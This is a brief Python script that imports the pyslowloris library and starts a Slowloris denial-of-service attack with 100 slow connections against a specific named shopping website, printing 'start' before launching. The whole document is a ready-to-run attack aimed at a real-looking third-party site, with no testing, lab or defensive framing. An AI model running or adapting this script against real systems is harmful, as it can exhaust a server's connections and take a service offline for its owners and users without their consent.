from pyslowloris import HostAddress, SlowLorisAttack

url = HostAddress.from_url("https://www.shoppingcenter.gr/")
connections_count = 100

loris = SlowLorisAttack(url, connections_count, silent=False)
print('start')
loris.start()